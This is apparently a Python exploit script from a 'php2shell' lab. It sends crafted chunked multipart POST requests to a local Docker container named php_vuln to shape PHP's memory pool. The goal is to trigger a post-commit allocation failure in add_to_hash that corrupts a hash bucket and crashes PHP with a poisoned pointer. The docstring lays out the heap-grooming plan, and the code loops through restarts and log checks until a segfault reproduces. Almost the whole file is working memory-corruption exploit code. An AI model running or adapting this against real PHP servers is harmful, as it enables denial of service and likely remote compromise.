#!/usr/bin/env python3
"""php2shell lab, oom23: value-ladder kill — drain the pool into the key band.

Blocker #6 found (oom22b preflight): max_input_vars=1000 caps elements —
the 64KB arData resize (element 1025) is unreachable; the reachable one
(element 513, deficit 18KB) can never leave the pool key-starved.
Self-financing law: freed param CONTAINS name+value -> equals next need at
every steady shape. Only drain: a value alloc that LANDS leaving free < 804.

Kill: descending value ladder (40 steps x 512B from 56KB) after calibrated
fill. The step where need lands with residual free < 804 -> next key's
zend_string_init (328B) dies POST-COMMIT inside add_to_hash -> malformed
bucket -> teardown dtor -> SIGSEGV 0x0808080808080808.
Value deaths (need > free) = clean pre-commit fatals -> logged, skipped.
rem coarse-parks the pool; boot jitter ±4KB covered by ladder width 20KB.

Budget: 9 n-parts + 455 fill units + 40 ladder + 200 keys = 704 vars < 1000.
Gate: fatal alloc <= 600 -> SEGFAULT CHECK; alloc >= 53248 -> value death.
"""
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

NKEYS = 200
LSTEPS = 40
V0 = 56 * 1024
DV = 512

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT and u < 455:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * min(total, UNIT)))
    # descending value ladder
    for s in range(LSTEPS):
        v = V0 - s * DV
        nm = POISON * 292 + b"L%d" % s
        ps.append(part(nm, POISON * v))
    # key run behind the ladder
    for k in range(NKEYS):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * 64))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=180)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "150"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    nf = 0
    for rep in range(3):
        for rem in (48000, 56000, 40000, 64000):
            restart()
            fatal, text = send(port, build(rem))
            a = alloc_n(text) if fatal else None
            if fatal:
                nf += 1
                if a is not None and a <= 600:
                    log(f"rep{rep} rem={rem}: fatal={fatal} alloc={a}  *** KEY DEATH — SEGFAULT CHECK ***")
                    time.sleep(1.5)
                    hits = segcheck()
                    for h in hits:
                        log("SEGV: " + h)
                    if hits:
                        log("*** SEGFAULT REPRODUCED — chain complete ***")
                        return
                elif a is not None and a >= 53248:
                    log(f"rep{rep} rem={rem}: fatal={fatal} alloc={a} (value death, clean)")
                else:
                    log(f"rep{rep} rem={rem}: fatal={fatal} alloc={a}")
            else:
                log(f"rep{rep} rem={rem}: survive")
    log(f"== oom23 done: {nf} fatals ==")

if __name__ == "__main__":
    main()
